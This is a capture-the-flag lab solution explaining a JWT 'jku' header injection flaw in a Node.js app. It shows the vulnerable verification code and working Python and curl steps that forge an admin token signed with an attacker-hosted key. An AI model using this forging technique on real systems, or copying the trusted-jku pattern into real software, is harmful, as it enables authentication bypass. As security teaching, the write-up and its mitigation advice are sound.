# Solution - Lab #7: Puppet Master

## Root Cause

`index.js` uses `header.jku` as the `jwksUri` for `jwks-rsa` without any domain validation:

```javascript
const jwksUri = decoded.header.jku || 'http://localhost:3000/.well-known/jwks.json';
const client  = jwksRsa({ jwksUri, cache: false, timeout: 5000 });
```

`jwks-rsa` is not at fault - it fetches from whatever URL it is given. The bug is trusting the URL embedded in the token being verified. An attacker who controls a URL reachable by the server can serve their own JWK Set and have any token they forge accepted as valid.

## Exploit Steps

### 1. Get a legitimate token

Login as any user. Inspect the `session` cookie - it is a standard RS256 JWT with `kid: nexus-key-1` and no `jku` field (the server falls back to its own JWKS).

### 2. Generate an attacker RSA keypair

```python
from cryptography.hazmat.primitives.asymmetric import rsa
attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
```

### 3. Serve your JWK Set

Start a minimal HTTP server that returns your public key as a JWKS. The `kid` must match what you put in the forged token header.

```python
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(MY_JWKS_JSON.encode())
    def log_message(self, *args): pass

server = HTTPServer(('localhost', 3001), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()
```

### 4. Forge the token

Set `jku` to your JWKS server and `kid` to match the key in your JWK Set:

```python
header = b64url_enc(json.dumps({
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attacker-key-1",
    "jku": "http://localhost:3001/jwks.json"
}, separators=(',', ':')))
body = b64url_enc(json.dumps({"name": "hacker", "role": "admin"}, separators=(',', ':')))
sig  = b64url_enc(rs256_sign(attacker_key, f"{header}.{body}".encode()))
token = f"{header}.{body}.{sig}"
```

### 5. Capture the flag

```bash
curl http://localhost:3000/api/admin/config \
  -H "Cookie: session=<forged_token>"
```

Response:

```json
{
  "flag": "FLAG{jku_1nj3ct10n_br1ng_y0ur_0wn_k3ys3t}",
  "config": { ... }
}
```

## Automated PoC

```bash
pip install requests cryptography pwntools
python poc.py
```

## Takeaway

Never resolve `jku` (or `x5u`) from the token being verified. The verification key source must be configured server-side - an out-of-band trusted URL, not a claim the attacker controls.

## References

- [Lab: JWT authentication bypass via jku header injection (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection) - Lab hosting a malicious JWKS and pointing jku at it to have the server fetch an attacker-controlled key
- [jwt_tool Attack Methodology Wiki (ticarpi)](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology) - Explains how jwt_tool automates jku injection and JWKS hosting in one command
- [JWT Vulnerabilities - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) - Covers jku injection alongside bypass tricks like redirect chains and URL-filter evasion
